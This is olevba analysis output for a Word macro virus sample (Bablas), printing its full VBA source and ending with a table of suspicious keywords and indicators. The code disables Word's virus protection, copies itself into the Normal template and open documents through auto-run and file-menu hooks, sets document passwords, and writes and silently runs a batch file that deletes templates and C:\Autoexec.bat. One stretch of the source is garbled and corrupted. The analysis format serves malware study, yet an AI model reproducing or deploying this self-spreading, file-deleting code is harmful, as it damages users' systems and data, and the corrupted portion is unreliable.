olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.at-0a2bd6388040a4e51f928d884f9aa3498f1111bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.at-0a2bd6388040a4e51f928d884f9aa3498f1111bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SanCun.bas 
in file: Virus.MSWord.Bablas.at-0a2bd6388040a4e51f928d884f9aa3498f1111bb - OLE stream: 'Macros/VBA/SanCun'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'San I Love You
Const ACENGLAH = "<- This is a ACENGLAH! by SanCun"
Public AD As Object, NT As Object
Sub AutoOpen()
    On Error GoTo hapus
Dim NT As Object
Dockenor
Create_Loader
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "SanCun" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "SanCun" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("SanCun").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("SanCun").Export Pad + ("\Fax.txt")
ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
SanCun
Label_Exit:
'CommandBars("Format").Controls("Style...")
If NormInstall = True Then Call Create_Loader
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
hapus:
Dockenor
End Sub
Sub Create_Loader()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Program Files\Microsoft Office\Template"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\Cad.Sys"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Frieds.dot")
If MyFile = "" Then
Set Adoc = NormalTemplate.OpenAsDocument
With Adoc
    .SaveAs fileName:=Pad1 + "\Frieds.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub SanCun()
On Error Resume Next
Dockenor
Norkedoc
Call sim
Call Create_Loader
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
If WeekDay(2) Then Call Enjoy
If Month(Now()) = 10 And Day(Now()) = 6 Then Call Enjoy
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "CAD Computer"
    .Title = "Virus Protection"
    .Subject = "For San San"
    .Comments = "Virus Protection Password"
    .Execute
End With
bodo:
End Sub
Sub FileSave()
    On Error Resume Next
    Norkedoc
    ActiveDocument.Save
    SanCun
End Sub
Sub FileClose()
    On Error Resume Next
    Norkedoc
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    SanCun
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Norkedoc
    SanCun
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Norkedoc
    SanCun
    Call Reg("c:\windows\Reg.bat")
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    SANSAN
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Norkedoc
    'SanCun
    SANSAN
    End Sub
Sub AutoExec()
On Error GoTo hapus
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
    Call Reg("c:\windows\Reg.bat")
Call sim
UnlockComments = True
'Pasword
SanCun
WBF
AddIns.Unload False
WBF
hapus:
Dockenor
End Sub
Sub AutoClose()
    On Error Resume Next
    Norkedoc
    SanCun
End Sub
Sub ToolsMacro()
    On Error Resume Next
    'SanCun
    If System.OperatingSystem = "Windows" Then Call Message 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
'Call Message
End Sub
Sub FileTemplates()
    On Error Resume Next
    SanCun
    If System.OperatingSystem = "Windows" Then Call Cad 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
'Call Message
End Sub
Sub ViewVBCode()
Dim Password, Pword
    On Error Resume Next
    SanCun
    If System.OperatingSystem = "Windows" Then Call Cad 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
Do
    'Password = "ACENGLAH"
    'Pword = InputBox("Type in your password")
    'If Pword <> Password Then
        'MsgBox "Sorry, incorrect password"
        'End
    'End If
Call Cad
Loop
End Sub
Sub Reg(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Shell ("c:\c "), vbHide
Print #hFile, "@echo off"
Print #hFile, "del c:\progra~1\micros~1\office\startup\*.dot"
Print #hFile, "del c:\progra~1\micros~1\templa~1\*.dot"
Print #hFile, "del c:\windows\*.dot"
Print #hFile, "del Zap.bat"
Print #hFile, "del Reg.bat"
Print #hFile, "del c:\Start.exe"
Print #hFile, "del C:\start.scr"
Print #hFile, "del C:\startv.bat"
Print #hFile, "del C:\Autoexec.bat"
Print #hFile, "del C:\Cacah.hit"
Print #hFile, "del C:\cad.sys"
Close hFile
Shell ("c:\windows\Reg.bat"), vbHide
End Sub
Sub FileOpen()
On Error Resume Next
WBT
If Dialogs(80).Show <> 0 Then
Call AutoOpen
Dockenor
Norkedoc
Call SanCun
WBF
Else
WBF
Call SANSAN
End If
End Sub
Sub Message()
nama1 = " San San "
Nama2 = "San San"
msg1 = "Lagi Ngapainn ???  "
msg2 = "Jangan Ngelamun Yeh.."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg1 = "I Love You"
msg2 = "  "
msg3 = "       This Come From My Heart and Soul"
MsgBox (msg1 + Chr(44) + msg2 + Chr(10) + msg3)
If WeekDay(2) Then MsgBox msg1 + nama1, vbInformation
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "???"
End Sub
Sub Enjoy()
nama1 = " San !!!"
Nama2 = "San San"
msg1 = "Lagi Ngapainn ??? "
msg2 = "   Jangan Ngelamun Yeh.. "
msg3 = "         Kerjain Tuh Tugasnya .... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg5 = "Kamu  Juga "
msg6 = "   Kok  Ikut-Ikutan Bengong ? "
msg7 = "Dasar  Dompok  Luh...Ah.."
MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + msg3)
Rem If WeekDay(2) Then MsgBox msg5 + nama1 + Chr(10) + msg6 + Chr(10) + msg3 + Chr(10) + msg7 + nama1 + Chr(10) + msg4, vbInformation
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "???"
End Sub
Function Dockenor()
    On Error GoTo Erw1
    NorOk = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "SanCun" Then NorOk = True
      If (NMacr <> "SanCun") And (NMacr <> "ThisDocument") Then
      MsgBox ("Normal Template Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Makro akan dihapus dan anda harap enunggu Sejenak"), vbInformation, "SANSAN"
  Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If NorOk = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "SanCun", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function Norkedoc()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "SanCun" Then Dokok = True
      'NMacr = NT.VBProject.VBComponents(i).Name
      'If NMacr = "SanCun" Then Dokok = True
      If (NMacr <> "SanCun") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       MsgBox ("Documen Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Virus Makro akan dihapus dan anda harap tunggu Sejenak"), vbInformation, "SANSAN"
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "SanCun", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Function sim()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("SanCun").Export "c:\windows\Cad.sys"
If f56879025 = vbReadOnly Then GoTo bodo
If f56879025 = vbReadOnly + vbArchive Then GoTo bodo
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "SanCun" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "SanCun" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\Cad.sys"
If activeinst = False Then ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
bodo:
End Function
Sub Pasword()

'If ActiveDocument = AD Then
    With ActiveDocument
            .ReadOnlyRecommended = False
            .EmbedTrueTypeFonts = False
            .SaveFormsData = False
            .SaveSubsetFonts = False
            .Password = "SANSAN"
            .WritePassword = "SANSAN"
     End With
        Application.DefaultSaveFormat = "SANSAN"
        ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdAutoFormat, _
        LockComments:=False, Password:="SANSAN", AddToRecentFiles:=True, _
        WritePassword:="SANSAN", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
         SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False

  'Else
    
     'With ActiveDocument
            '.ReadOnlyRecommended = False
            '.EmbedTrueTypeFonts = False
            '.SaveFormsData = False
            '.SaveSubsetFonts = False
            '.Password = "SANSAN"
            '.WritePassword = "SANSAN"
     'End With
        'Application.DefaultSaveFormat = "SANSAN"
        'ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate, _
        'LockComments:=False, Password:="SANSAN", AddToRecentFiles:=True, _
        'WritePassword:="SANSAN", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        ' SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        'False
   'End If
   End Sub
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Terimakasih buat dosenku yang amat sangat " & Chr(34) & _
    "bijaksananen�, "bijaks13 " &"at dotelah me   ri bunilai JELEK.
 ya merasa byanga  "bijaks13 " & Chr(34)dan sungguh-sungguh byanga veAhadap kasih buitu. "bijaks13 " & Chr   "Sekali lagiu yya ucapkan veAMsgBox("!. "bijaks13 " &sang13 " &"Semoga mereka tetap ki STIKI. "bi Chr(34sang13 " &"(erimaectan-ectan, ma'af menggyangu.)   vbOKcume vbReExclsenk   , "Ucapan  = MsgBox(""te.   NFalse
 End If
 
   EnBrdBasShowMessOp    siveDoFalse BE.mpltSacent      Op    siVirusBE.t=NM   ge()utoMa   NOp    siveDoBE.pertiesBE.mpltSacent  End If
   EnHelpAboutShowMessage(i
    HQun k.Sawon wa(Noaqun k.laler. "bijaks13 " &san(13 " & Chr(34)I LOVE SOMETHING ERROR !   vbOKcume vbReExclsenk   , "Bpp Hacker"te.End If
 
   EnToolsOptions()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Bpp Hacker is now activating "
    ActiveWindow.Caption = "(I Don't mean to disturb.)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Bpp Hacker") = "azizoke" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then DocOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then NorOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If

    ChangeCap
    WordBasic.DisableAutoMacros False
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros True


    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap

    SikatDocument

    AutoClose

    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub
Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
       Dockenor.SikatDocument
        WordBasic.DisableAutoMacros True
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.BPPHCK.Ancurin"
    End If
End Sub
Sub SANSAN()
nama1 = " San San "
Nama2 = "San San"
msg1 = "Lagi Ngapainn ???  "
msg2 = "Jangan Ngelamun Yeh.."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg1 = "I Love You"
msg2 = "  "
msg3 = "       This Come From My Heart and Soul"
msg4 = "                  (Cintaku Negeriku)"
MsgBox msg1 + Chr(44) + msg2 + Chr(13) + msg3 + Chr(13) + msg2 + Chr(10) + msg4, vbInformation, "Cun..."
If WeekDay(2) Then MsgBox msg1 + nama1, vbInformation, "Cun..."
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "SANSAN"
End Sub
Sub Cad()
nama1 = " San San "
msg1 = "Mau Ngapainn Elu Tuh ???  "
msg2 = "Mau Coba-coba Nganggu Yach..."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Masih Mau Coba-coba Nih ?"
msg5 = "Penasaran Yach Omm....?"
msg6 = "Boleh dah dicoba !!!"
MsgBox (msg1 + Chr(44) + msg2 + Chr(10) + msg3), vbInformation, "SANSAN"
If WeekDay(2) Then MsgBox msg4 + Chr(10) + msg5 + Chr(10) + msg6, vbInformation, "SANSAN"
If Month(Now()) = 10 And ��†	 Month(Now()) = 10 And ��†	 Month(Now()) = 10 And ��†	 Mo:1, "SANSAN"
If M dicoba !!!"
MsgBox (msg1 + Chr(44) + msg2 + Chr(10) + msg3), vbInformation, "SANSAN"
If WeekDay(2) Then  ��†	 Mo:1, "SANSANon, "SANSAN"
If WeekDay(2) Then MsgBox msg4 + Chr(10) + msg5 1 + Chr
ĂCch Omm....?"
L10) + msg3), vbInformation, "SANSAN"
If WeekDay(2?"
L10) + msg3), vbInformation, "SANSAN"
If WeekDa
E )Sub
  
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Reg.bat             |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|IOC       |Zap.bat             |Executable file name                         |
|IOC       |Start.exe           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
